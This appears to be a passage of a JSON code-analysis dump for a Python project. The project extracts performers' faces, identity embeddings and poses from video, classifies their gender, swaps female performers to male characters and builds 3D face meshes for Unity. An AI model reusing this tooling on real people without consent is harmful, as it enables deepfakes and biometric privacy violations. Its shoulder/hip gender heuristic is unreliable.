          "def _get_face_mesh(self):\n\"\"\"Get MediaPipe face mesh for 468-point landmarks.\"\"\"\nif self._face_mesh is None:\ntry:\nimport mediapipe as mp\nself._face_mesh = mp.solutions.face_mesh.FaceMesh(\nstatic_image_mode=True,\nmax_num_faces=1,\nrefine_landmarks=True,\nmin_detection_confidence=0.5",
          "def _create_canonical_template(self) -> np.ndarray:\n\"\"\"Create canonical 68-point face template.\"\"\"\n# Standard frontal face proportions (normalized 0-1)\ntemplate = np.array([\n# Jaw (0-16)\n[0.15, 0.45], [0.13, 0.55], [0.12, 0.65], [0.14, 0.75],\n[0.18, 0.84], [0.25, 0.91], [0.33, 0.96], [0.42, 0.99],\n[0.50, 1.00], [0.58, 0.99], [0.67, 0.96], [0.75, 0.91],\n[0.82, 0.84], [0.86, 0.75], [0.88, 0.65], [0.87, 0.55],\n[0.85, 0.45],",
          "def _get_eye_centers(self, landmarks: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:\n\"\"\"Get left and right eye centers from 68 landmarks.\"\"\"\nleft_eye = landmarks[LEFT_EYE_CENTER].mean(axis=0)\nright_eye = landmarks[RIGHT_EYE_CENTER].mean(axis=0)\nreturn left_eye, right_eye\n\ndef _align_crop_as_face(self, image: np.ndarray) -> AlignedFace:\n\"\"\"Handle pre-cropped face images where detection fails.\"\"\"",
          "def _align_crop_as_face(self, image: np.ndarray) -> AlignedFace:\n\"\"\"Handle pre-cropped face images where detection fails.\"\"\"\nh, w = image.shape[:2]\n\n# Resize to output size\naligned_img = cv2.resize(image, (self.output_size, self.output_size),\ninterpolation=cv2.INTER_CUBIC)\n\n# Use canonical landmarks scaled to image\nlandmarks = self.canonical_landmarks.copy() * np.array([w, h])",
          "def _compute_alignment_transform(self, landmarks: np.ndarray,",
          "def align_face(self, image: np.ndarray,",
          "def _convert_106_to_68(self, lm106: np.ndarray) -> np.ndarray:\n\"\"\"Convert 106-point landmarks to 68-point format.\"\"\"\n# Mapping from 106 to 68 (approximate)\n# This is a simplified mapping - full mapping would be more complex\nmapping = [\n# Jaw: 0-16\n0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32,\n# Right eyebrow: 17-21\n33, 34, 35, 36, 37,\n# Left eyebrow: 22-26",
          "def _estimate_68_from_5(self, kps: np.ndarray, bbox: np.ndarray) -> np.ndarray:\n\"\"\"Estimate 68 landmarks from 5 keypoints + bbox.\"\"\"\n# 5 keypoints: left_eye, right_eye, nose, left_mouth, right_mouth\nx1, y1, x2, y2 = bbox[:4]\nw, h = x2 - x1, y2 - y1\n\n# Scale canonical template to bbox\nlandmarks = self.canonical_landmarks.copy()\nlandmarks[:, 0] = landmarks[:, 0] * w + x1\nlandmarks[:, 1] = landmarks[:, 1] * h + y1",
          "def _generate_uv_coords(self, landmarks: np.ndarray) -> np.ndarray:\n\"\"\"Generate UV coordinates for texture mapping.\"\"\"\n# Use canonical template as UV base\n# Landmarks map to UV space for game engine texture application\nuv = self.canonical_landmarks.copy()\n\n# Adjust based on actual face shape\n# Interpolate between canonical and detected for better fit\nblend = 0.3  # 30% detected, 70% canonical for stability\nuv = uv * (1 - blend) + landmarks[:68] * blend",
          "def __init__(self, texture_size: int = 2048):",
          "def create_face_texture(self, aligned_face: AlignedFace,",
          "def export_for_unity(self, aligned_face: AlignedFace,",
          "def process_performer_faces(pipeline_output: Path) -> Dict:\n\"\"\"Process all performer faces in pipeline output.\"\"\"\npipeline_output = Path(pipeline_output)\naligner = FaceAligner(output_size=512)\nmapper = FaceTextureMapper(texture_size=1024)\n\nresults = {}\n\nfor performer_dir in pipeline_output.glob(\"performer_*\"):\nif not performer_dir.is_dir():",
          "def main():"
        ],
        "class_defs": [
          "class AlignedFace:",
          "class FaceAligner:",
          "class FaceTextureMapper:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from dataclasses import dataclass",
          "from typing import List, Dict, Optional, Tuple",
          "import json",
          "from insightface.app import FaceAnalysis",
          "import mediapipe as mp",
          "import argparse"
        ],
        "comments": [
          "# Standard 68-point landmark indices",
          "# Key alignment points",
          "# Original image crop",
          "# 68-point landmarks (normalized 0-1)",
          "# Alignment transform matrix",
          "# Face bounding box in original image",
          "# Alignment metrics",
          "# Optional 3D landmarks",
          "# UV coordinates for texture mapping",
          "# Canonical face template (normalized coordinates)",
          "# Based on average frontal face proportions",
          "# Standard frontal face proportions (normalized 0-1)",
          "# Jaw (0-16)",
          "# Right eyebrow (17-21)",
          "# Left eyebrow (22-26)",
          "# Nose bridge (27-30)",
          "# Nose tip (31-35)",
          "# Right eye (36-41)",
          "# Left eye (42-47)",
          "# Outer lip (48-59)",
          "# Inner lip (60-67)",
          "# Resize to output size",
          "# Use canonical landmarks scaled to image",
          "# Estimate eye distance from image width",
          "# Generate UV coordinates",
          "# Compute angle",
          "# Inter-eye distance",
          "# Desired eye distance (30% of output size)",
          "# Eye center",
          "# Build transform",
          "# Adjust translation to center face",
          "# Upscale small images for better detection",
          "# Detect face if not provided",
          "# If no face detected and it's a crop, use whole image as face",
          "# Get landmarks",
          "# Convert 106-point to 68-point (approximate mapping)",
          "# Only 5 keypoints, need to estimate 68",
          "# Compute alignment transform",
          "# Warp image",
          "# Transform landmarks",
          "# Normalize to 0-1",
          "# Get bbox",
          "# Try to get 3D landmarks from MediaPipe",
          "# Generate UV coordinates for texture mapping",
          "# Mapping from 106 to 68 (approximate)",
          "# This is a simplified mapping - full mapping would be more complex",
          "# Jaw: 0-16",
          "# Right eyebrow: 17-21",
          "# Left eyebrow: 22-26",
          "# Nose: 27-35",
          "# Right eye: 36-41",
          "# Left eye: 42-47",
          "# Outer lip: 48-59",
          "# Inner lip: 60-67",
          "# 5 keypoints: left_eye, right_eye, nose, left_mouth, right_mouth",
          "# Scale canonical template to bbox",
          "# Adjust key points to match detected keypoints",
          "# Left eye center",
          "# Right eye center",
          "# Nose",
          "# Mouth",
          "# Use canonical template as UV base",
          "# Landmarks map to UV space for game engine texture application",
          "# Adjust based on actual face shape",
          "# Interpolate between canonical and detected for better fit",
          "# Expand canvas",
          "# Create texture with gradient alpha for blending",
          "# Center the face",
          "# Create alpha mask (elliptical fade)",
          "# Gaussian blur for smooth falloff",
          "# Resize to texture size",
          "# Create and save texture",
          "# Export UV coordinates",
          "# Find face image",
          "# Align face (these are pre-cropped face images)",
          "# Save aligned face",
          "# Export for Unity",
          "# Process pipeline output",
          "# Process single image",
          "# Save aligned face",
          "# Export texture"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/full_swap_pipeline.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, output_dir: Path):",
          "def _get_face_app(self):",
          "def _get_pose_detector(self):",
          "def process_video(self, video_path: str, sample_rate: int = 30):\n\"\"\"\nProcess video to extract faces and poses.\n\"\"\"",
          "def cluster_performers(self):\n\"\"\"\nCluster face detections to identify distinct performers.\n\"\"\"",
          "def swap_performers(self, male_face_dir: Optional[Path] = None):\n\"\"\"\nSwap female performers to male characters.\n\"\"\"",
          "def reconstruct_3d_meshes(self, video_path: str, sample_rate: int = 30):\n\"\"\"\nReconstruct 3D body and face meshes for each performer from video.\nUses photorealistic face reconstruction with texture extraction.\n\"\"\"",
          "def export_combined_animation(self):\n\"\"\"\nExport combined animation data for all performers.\n\"\"\"",
          "def generate_summary(self):\n\"\"\"Generate final summary.\"\"\"\nprint(f\"\\n{'='*50}\")\nprint(\"PIPELINE COMPLETE\")\nprint('='*50)\n\nsummary = {\n\"output_dir\": str(self.output_dir),\n\"performers\": []\n}",
          "def main():"
        ],
        "class_defs": [
          "class PerformerData:",
          "class FullSwapPipeline:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from dataclasses import dataclass, field",
          "from typing import List, Dict, Optional, Tuple",
          "from collections import defaultdict",
          "import json",
          "import argparse",
          "from sklearn.cluster import DBSCAN",
          "import sys",
          "from anatomical_retarget import (",
          "from body_reconstruction import (",
          "from face_reconstruction import PhotorealisticFaceReconstructor",
          "from insightface.app import FaceAnalysis",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "import mediapipe as mp",
          "import traceback"
        ],
        "comments": [
          "# ML imports",
          "# Local imports",
          "# Best face capture",
          "# Motion data (list of poses per frame)",
          "# Output paths",
          "# Lazy load models",
          "# Collected data",
          "# Detect faces",
          "# Face crop",
          "# Face center for matching with pose",
          "# Detect poses",
          "# Pose center (use hip midpoint)",
          "# Extract embeddings",
          "# Cluster",
          "# Build performer profiles",
          "# Vote on gender",
          "# Best face",
          "# Mean embedding",
          "# Assign poses to this performer based on face proximity",
          "# Find closest pose",
          "# Load male face if provided",
          "# Also try direct path",
          "# Setup retargeter",
          "# Retarget poses",
          "# Save retargeted poses",
          "# Generate body morphs",
          "# Export physics config",
          "# Swap face",
          "# Save original for reference",
          "# Mark as swapped",
          "# Save original poses",
          "# Save face",
          "# Still export physics for male",
          "# Initialize reconstructors for each performer",
          "# Use new photorealistic face reconstructor (single instance, faster)",
          "# Collect face frames for each performer",
          "# Build frame-to-performer mapping from pose assignments",
          "# Process body for all performers visible in this frame",
          "# Collect frames for photorealistic face reconstruction",
          "# Build and export meshes for each performer",
          "# Determine target gender",
          "# Extract measurements and build body mesh",
          "# Export body mesh",
          "# Save measurements",
          "# Build photorealistic face mesh with texture",
          "# Limit to best 50 frames to avoid memory issues",
          "# Fallback to basic face reconstruction",
          "# Reconstruct 3D meshes (body + face) for realistic preview"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 7,
        "error_handling": 4,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/animate_face.py",
        "docstrings": [],
        "function_defs": [
          "def get_face_landmarks_from_image(image_path):\n\"\"\"Get 68 landmarks from face image using insightface\"\"\"\ntry:\nimport insightface\nfrom insightface.app import FaceAnalysis\n\napp = FaceAnalysis(allowed_modules=['detection', 'landmark_2d_106'])\napp.prepare(ctx_id=-1, det_size=(512, 512))\n\nimg = cv2.imread(str(image_path))",
          "def get_landmarks_with_mediapipe(image_path):\n\"\"\"Fallback: get landmarks using mediapipe\"\"\"\nimport mediapipe as mp\n\nmp_face_mesh = mp.solutions.face_mesh\n\nimg = cv2.imread(str(image_path))\nif img is None:\nreturn None\n",
          "def apply_expression(landmarks, expression_name, intensity=1.0):\n\"\"\"Apply expression morph to landmarks\"\"\"\nif expression_name not in EXPRESSIONS:\nreturn landmarks.copy()\n\nmorphed = landmarks.copy()\noffsets = EXPRESSIONS[expression_name]\n\nfor idx, (dx, dy) in offsets.items():\nif idx < len(morphed):",
          "def warp_triangle(img1, img2, t1, t2):\n\"\"\"Warp triangle from img1 to img2\"\"\"\n# Bounding boxes\nr1 = cv2.boundingRect(np.float32([t1]))\nr2 = cv2.boundingRect(np.float32([t2]))\n\n# Offset points\nt1_rect = [(t1[i][0] - r1[0], t1[i][1] - r1[1]) for i in range(3)]\nt2_rect = [(t2[i][0] - r2[0], t2[i][1] - r2[1]) for i in range(3)]\n",
          "def warp_face(src_img, src_landmarks, dst_landmarks):\n\"\"\"Warp source face to match destination landmarks\"\"\"\nh, w = src_img.shape[:2]\n\n# Add boundary points\nboundary_pts = [\n[0, 0], [w//2, 0], [w-1, 0],\n[0, h//2], [w-1, h//2],\n[0, h-1], [w//2, h-1], [w-1, h-1]\n]",
          "def create_expression_animation(image_path, output_path, expressions_list=None, fps=15):\n\"\"\"Create animated GIF showing different expressions\"\"\"\n\nif expressions_list is None:\nexpressions_list = [\"neutral\", \"smile\", \"surprised\", \"angry\", \"sad\", \"neutral\"]\n\nprint(f\"Loading image: {image_path}\")\nimg = cv2.imread(str(image_path))\nif img is None:\nprint(\"Failed to load image\")",
          "def create_expression_strip(image_path, output_path):\n\"\"\"Create a horizontal strip showing all expressions\"\"\"\n\nprint(f\"Loading image: {image_path}\")\nimg = cv2.imread(str(image_path))\nif img is None:\nprint(\"Failed to load image\")\nreturn False\n\nlandmarks = get_face_landmarks_from_image(image_path)",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import argparse",
          "from scipy.spatial import Delaunay",
          "import imageio",
          "import insightface",
          "from insightface.app import FaceAnalysis",
          "import mediapipe as mp"
        ],
        "comments": [
          "# Expression morph targets - offsets for key landmarks",
          "# Based on 68-point landmark model:",
          "# 0-16: jaw, 17-21: left eyebrow, 22-26: right eyebrow",
          "# 27-35: nose, 36-41: left eye, 42-47: right eye",
          "# 48-67: mouth",
          "# Mouth corners up and out",
          "# Cheeks up",
          "# Slight eye squint",
          "# Eyebrows up",
          "# Eyes wide",
          "# Mouth open",
          "# Eyebrows down and together",
          "# Slight eye squint",
          "# Mouth tight",
          "# Eyebrows inner up, outer down",
          "# Mouth corners down",
          "# Right eye closed",
          "# Slight smile",
          "# Get 2D landmarks (106 points, convert to 68)",
          "# Convert 106-point to 68-point (approximate mapping)",
          "# This is a simplified mapping",
          "# MediaPipe to 68-point mapping (approximate)",
          "# Jaw (0-16)",
          "# Left eyebrow (17-21)",
          "# Right eyebrow (22-26)",
          "# Nose (27-35)",
          "# Left eye (36-41)",
          "# Right eye (42-47)",
          "# Mouth (48-67)",
          "# Bounding boxes",
          "# Offset points",
          "# Get mask",
          "# Apply affine transform",
          "# Warp",
          "# Copy to output",
          "# Add boundary points",
          "# Delaunay triangulation",
          "# Output image",
          "# Warp each triangle",
          "# Ease in-out",
          "# Interpolate between expressions",
          "# Warp face",
          "# Convert BGR to RGB for GIF",
          "# Hold on final expression",
          "# Add label",
          "# Concatenate horizontally"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/blender_view_face.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import bpy",
          "import os"
        ],
        "comments": [
          "# Clear scene",
          "# Import the OBJ",
          "# Get the imported object",
          "# Center and scale",
          "# Create material with texture",
          "# Load texture",
          "# Add rotation animation",
          "# Add camera looking at face",
          "# Add lighting",
          "# Save"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/gender_classifier_v3.py",
        "docstrings": [],
        "function_defs": [
          "def get_insightface():",
          "def add_detection(self, embedding: np.ndarray, position: Tuple[float, float],",
          "def get_mean_embedding(self) -> np.ndarray:",
          "def get_gender(self) -> Tuple[str, float]:",
          "def __init__(self,",
          "def _ensure_models(self):",
          "def _cosine_similarity(self, a: np.ndarray, b: np.ndarray) -> float:",
          "def _find_performer(self, position: Tuple[float, float], embedding: np.ndarray,",
          "def _get_body_ratio(self, pose_landmarks: np.ndarray) -> Optional[float]:\n\"\"\"Calculate shoulder/hip ratio\"\"\"\nif len(pose_landmarks) < 25:\nreturn None\n\nLEFT_SHOULDER, RIGHT_SHOULDER = 11, 12\nLEFT_HIP, RIGHT_HIP = 23, 24\n\nif (pose_landmarks[LEFT_SHOULDER, 3] < 0.5 or\npose_landmarks[RIGHT_SHOULDER, 3] < 0.5 or",
          "def process_frame(self, frame: np.ndarray, frame_idx: int,",
          "def merge_similar_performers(self):\n\"\"\"Post-process: merge performers that are likely the same person\"\"\"\nif len(self.performers) < 2:\nreturn\n\nmerged = []\nused = set()\n\nfor i, p1 in enumerate(self.performers):\nif i in used or p1.frame_count < 2:",
          "def get_final_performers(self, min_frames: Optional[int] = None) -> List[Dict]:\n\"\"\"Get final list of performers with gender classification\"\"\"\nif min_frames is None:\nmin_frames = self.min_frames\n\n# Merge similar performers first\nself.merge_similar_performers()\n\nresults = []\nfor p in self.performers:",
          "def save_faces(self, output_dir: Path):\n\"\"\"Save best face for each performer\"\"\"\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nfor p in self.performers:\nif p.frame_count >= self.min_frames and p.best_face is not None:\ngender, _ = p.get_gender()\npath = output_dir / f\"performer_{p.id}_{gender}.png\"\ncv2.imwrite(str(path), p.best_face)",
          "def classify_video(video_path: str, output_dir: str, sample_rate: int = 30) -> Dict:\n\"\"\"Process video and classify performers\"\"\"\nimport mediapipe as mp\nfrom mediapipe.tasks import python as mp_tasks\nfrom mediapipe.tasks.python import vision\n\nvideo_path = Path(video_path)\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n"
        ],
        "class_defs": [
          "class TrackedPerformer:",
          "class RobustGenderClassifier:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from dataclasses import dataclass, field",
          "from typing import List, Dict, Tuple, Optional",
          "from collections import defaultdict",
          "import json",
          "from insightface.app import FaceAnalysis",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "import argparse"
        ],
        "comments": [
          "# Also factor in body ratio if available",
          "# Males: shoulder/hip > 1.1, Females: < 1.0",
          "# Skip if too many frames since last seen (performer left scene)",
          "# Position distance",
          "# Embedding similarity",
          "# Combined score (position match is primary)",
          "# Detect faces",
          "# Normalized position",
          "# Face crop for best face tracking",
          "# Face quality score",
          "# Find or create performer",
          "# Add body ratio if pose available",
          "# Find similar performers to merge",
          "# Check embedding similarity",
          "# Merge all into one",
          "# Add remaining unmerged performers with enough frames",
          "# Merge similar performers first",
          "# Setup pose detector",
          "# Process video",
          "# Get final results",
          "# Save faces",
          "# Print summary"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/orchestrator.py",
        "docstrings": [],
        "function_defs": [
          "def get_insightface_app():\n\"\"\"Lazy load insightface\"\"\"\nglobal _insightface_app\nif _insightface_app is None:\ntry:\nfrom insightface.app import FaceAnalysis\n_insightface_app = FaceAnalysis(\nallowed_modules=['detection', 'recognition', 'landmark_2d_106']\n)\n_insightface_app.prepare(ctx_id=-1, det_size=(640, 640))",
          "def get_deepface():\n\"\"\"Lazy load DeepFace\"\"\"\nglobal _deepface_loaded\nif not _deepface_loaded:\ntry:\nfrom deepface import DeepFace\n_deepface_loaded = True\nreturn DeepFace\nexcept ImportError:\nprint(\"Warning: DeepFace not available\")",
          "def download_model(model_name: str, url: str, models_dir: Path) -> Path:\n\"\"\"Download model if not exists\"\"\"\nmodel_path = models_dir / model_name\nif not model_path.exists():\nprint(f\"Downloading {model_name}...\")\nmodels_dir.mkdir(parents=True, exist_ok=True)\nurllib.request.urlretrieve(url, str(model_path))\nreturn model_path\n\n",
          "def __init__(self):",
          "def extract_faces(self, frame: np.ndarray, frame_idx: int) -> List[FaceData]:\n\"\"\"Extract all faces from frame using Tasks API\"\"\"\nh, w = frame.shape[:2]\nrgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n\n# Create MediaPipe Image\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb)\n\n# Detect faces\nresult = self.face_landmarker.detect(mp_image)",
          "def extract_bodies(self, frame: np.ndarray, frame_idx: int) -> List[BodyData]:\n\"\"\"Extract body poses from frame using Tasks API\"\"\"\nh, w = frame.shape[:2]\nrgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n\n# Create MediaPipe Image\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb)\n\n# Detect poses\nresult = self.pose_landmarker.detect(mp_image)",
          "def close(self):",
          "def __init__(self):",
          "def classify(self, face_image: np.ndarray) -> Tuple[Gender, float]:\n\"\"\"Classify gender from face image\"\"\"\nif self.deepface is None:\nreturn Gender.UNKNOWN, 0.0\n\nif face_image.size == 0 or face_image.shape[0] < 48 or face_image.shape[1] < 48:\nreturn Gender.UNKNOWN, 0.0\n\ntry:\nresult = self.deepface.analyze(",
          "def __init__(self):",
          "def encode(self, face_image: np.ndarray) -> Optional[np.ndarray]:\n\"\"\"Generate 512-dim face embedding\"\"\"\nif self.app is None:\nreturn None\n\nif face_image.size == 0:\nreturn None\n\ntry:\nfaces = self.app.get(face_image)",
          "def __init__(self, width: int = 800, height: int = 600):",
          "def create_character_preview(self, performer: PerformerData,",
          "def _draw_skeleton(self, canvas, body: BodyData,",
          "def to_screen(idx):",
          "def __init__(self, output_dir: str = \"./output\", num_workers: int = 2):",
          "def extract_from_video(self, video_path: str,",
          "def save_performer(self, performer: PerformerData, output_dir: Path) -> Dict:\n\"\"\"Save performer data to disk\"\"\"\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nmanifest = {\n\"id\": performer.id,\n\"gender\": performer.gender.value,\n}\n\n# Save face texture",
          "def generate_preview(self, result: ExtractionResult,",
          "def process_video(self, video_path: str,",
          "def close(self):\n\"\"\"Clean up resources\"\"\"\nself.extractor.close()\n\n\ndef main():\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Character Pipeline Orchestrator\")\nparser.add_argument(\"video\", help=\"Input video file\")",
          "def main():"
        ],
        "class_defs": [
          "class Gender(Enum):",
          "class FaceData:",
          "class BodyData:",
          "class PerformerData:",
          "class ExtractionResult:",
          "class CharacterExtractor:",
          "class GenderClassifier:",
          "class IdentityEncoder:",
          "class PreviewEngine:",
          "class Orchestrator:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "import time",
          "from dataclasses import dataclass, asdict",
          "from typing import List, Optional, Dict, Tuple",
          "from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor",
          "import threading",
          "import queue",
          "from enum import Enum",
          "import urllib.request",
          "import os",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "from insightface.app import FaceAnalysis",
          "from deepface import DeepFace",
          "from deepface import DeepFace",
          "import argparse"
        ],
        "comments": [
          "# MediaPipe Tasks API",
          "# Lazy imports for heavy modules",
          "# Download face landmarker model",
          "# Download pose landmarker model",
          "# Create face landmarker",
          "# Create pose landmarker",
          "# Create MediaPipe Image",
          "# Detect faces",
          "# Get 478 landmarks",
          "# Bounding box",
          "# Expand bbox by 20%",
          "# Create MediaPipe Image",
          "# Detect poses",
          "# Get world landmarks if available",
          "# Body bounding box from pose",
          "# Dark gradient background",
          "# Left side: Face close-up",
          "# Add border",
          "# Gender label",
          "# Right side: Body skeleton",
          "# Draw skeleton",
          "# Center: Info panel",
          "# Normalize to drawing area",
          "# Center",
          "# MediaPipe pose connections",
          "# Draw connections",
          "# Draw joints",
          "# Processing queue",
          "# Collect best frames for each performer",
          "# Extract faces and bodies",
          "# Match faces to bodies (by proximity)",
          "# Classify gender",
          "# Filter by gender if requested",
          "# Quality score: size * confidence * sharpness",
          "# Update best face for this performer slot",
          "# Get embedding for this face",
          "# Track bodies (simple: assign to slots by x-position)",
          "# Assemble performers",
          "# Save face texture",
          "# Save landmarks",
          "# Save 3D landmarks",
          "# Save embedding",
          "# Save body pose",
          "# Save manifest",
          "# Seek to the frame where face was captured",
          "# Extract",
          "# Save each performer",
          "# Generate previews"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 12,
        "decorators": [
          "@dataclass",
          "@dataclass",
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/fix_all_meshes.py",
        "docstrings": [],
        "function_defs": [
          "def fix_performer_meshes(performer_dir: Path):\n\"\"\"Fix meshes for a single performer\"\"\"\nprint(f\"\\n{'='*50}\")\nprint(f\"Fixing {performer_dir.name}\")\n\nbody_path = performer_dir / \"body_mesh.glb\"\nface_path = performer_dir / \"face_mesh_realistic.glb\"\n\nif not body_path.exists():\nprint(\"  No body mesh found\")",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import trimesh",
          "import numpy as np",
          "from pathlib import Path"
        ],
        "comments": [
          "# Load body mesh",
          "# Get the actual mesh geometry",
          "# Fix body position and scale",
          "# Move to ground level",
          "# Current height",
          "# Scale to target height (~1.75m for male)",
          "# Update and save",
          "# Now fix face mesh if it exists",
          "# Current face size",
          "# Target face size (about 0.22m for human face)",
          "# Scale face",
          "# Center face at origin first",
          "# Position face at head location (top of body minus half head height)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/gender_classifier_v2.py",
        "docstrings": [],
        "function_defs": [
          "def get_insightface():",
          "def add_embedding(self, emb: np.ndarray):",
          "def get_mean_embedding(self) -> np.ndarray:",
          "def vote_gender(self, gender: str, confidence: float = 1.0):",
          "def get_final_gender(self) -> Tuple[str, float]:\n\"\"\"Get final gender with confidence based on multiple signals\"\"\"\nmale_score = self.gender_votes[\"male\"]\nfemale_score = self.gender_votes[\"female\"]\n\n# Add body proportion signal\nif self.body_ratios:\nmean_ratio = np.mean(self.body_ratios)\n# Males typically have shoulder/hip ratio > 1.1\n# Females typically have ratio < 1.0",
          "def __init__(self, embedding_threshold: float = 0.5):",
          "def _ensure_models(self):",
          "def _cosine_similarity(self, a: np.ndarray, b: np.ndarray) -> float:\n\"\"\"Compute cosine similarity between two embeddings\"\"\"\nreturn float(np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b) + 1e-8))\n\ndef _find_matching_performer(self, embedding: np.ndarray) -> Optional[int]:\n\"\"\"Find performer that matches this embedding\"\"\"",
          "def _find_matching_performer(self, embedding: np.ndarray) -> Optional[int]:\n\"\"\"Find performer that matches this embedding\"\"\"\nbest_match = -1\nbest_sim = self.embedding_threshold\n\nfor i, performer in enumerate(self.performers):\nmean_emb = performer.get_mean_embedding()\nif np.any(mean_emb):\nsim = self._cosine_similarity(embedding, mean_emb)\nif sim > best_sim:",
          "def _get_body_ratio(self, pose_landmarks: np.ndarray) -> Optional[float]:\n\"\"\"Calculate shoulder/hip ratio from pose landmarks\"\"\"\n# MediaPipe pose indices\nLEFT_SHOULDER = 11\nRIGHT_SHOULDER = 12\nLEFT_HIP = 23\nRIGHT_HIP = 24\n\nif len(pose_landmarks) < 25:\nreturn None",
          "def process_frame(self, frame: np.ndarray, frame_idx: int,",
          "def get_performer_summary(self) -> List[Dict]:\n\"\"\"Get final summary of all performers\"\"\"\nsummary = []\nfor p in self.performers:\ngender, confidence = p.get_final_gender()\n\nsummary.append({\n\"id\": p.id,\n\"gender\": gender,\n\"confidence\": confidence,",
          "def save_best_faces(self, output_dir: Path):\n\"\"\"Save best face captures for each performer\"\"\"\noutput_dir = Path(output_dir)\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nfor p in self.performers:\nif p.best_face_frame is not None:\ngender, _ = p.get_final_gender()\nfilename = f\"performer_{p.id}_{gender}_face.png\"\ncv2.imwrite(str(output_dir / filename), p.best_face_frame)",
          "def classify_video(video_path: str, output_dir: str, sample_rate: int = 30) -> Dict:\n\"\"\"\nProcess video and classify all performers by gender.\n\nArgs:\nvideo_path: Path to video file\noutput_dir: Directory to save results\nsample_rate: Process every Nth frame\n\nReturns:"
        ],
        "class_defs": [
          "class PerformerProfile:",
          "class ImprovedGenderClassifier:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "from dataclasses import dataclass, field",
          "from typing import List, Dict, Tuple, Optional",
          "from collections import defaultdict",
          "import json",
          "from insightface.app import FaceAnalysis",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "import argparse"
        ],
        "comments": [
          "# Lazy imports",
          "# Add body proportion signal",
          "# Males typically have shoulder/hip ratio > 1.1",
          "# Females typically have ratio < 1.0",
          "# MediaPipe pose indices",
          "# Check visibility",
          "# Detect faces with insightface (includes gender, age, embedding)",
          "# Get face data",
          "# Normalize face position and size",
          "# Find or create performer profile",
          "# New performer",
          "# Update profile",
          "# Track best face (largest, most frontal)",
          "# Crop face with padding",
          "# Add body ratio if pose available",
          "# Find pose that matches this face (closest to face center)",
          "# Check if nose (index 0) is near face",
          "# Get current gender estimate",
          "# Initialize classifier",
          "# Initialize pose detector",
          "# Process video",
          "# Get pose landmarks if available",
          "# Process frame",
          "# Get final results",
          "# Save best faces",
          "# Save summary",
          "# Print summary"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/create_character.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, project_root: str = None):",
          "def create_from_video(self, video_path: str, config: CharacterConfig) -> Dict[str, Any]:\n\"\"\"Create a character from video input.\"\"\"\nvideo_path = Path(video_path)\n\n# Create character directory\nchar_dir = self.characters_dir / config.name\nchar_dir.mkdir(parents=True, exist_ok=True)\n\nprint(f\"\\n{'='*60}\")\nprint(f\"Creating character: {config.name}\")",
          "def _prepare_unity_export(self, name: str, config: Dict) -> Dict[str, str]:\n\"\"\"Prepare files for Unity import.\"\"\"\nexport_dir = self.exports_dir / \"unity\" / name\nexport_dir.mkdir(parents=True, exist_ok=True)\n\nexports = {}\n\n# Copy face mesh\nif config['face']['mesh']:\nsrc = Path(config['face']['mesh'])",
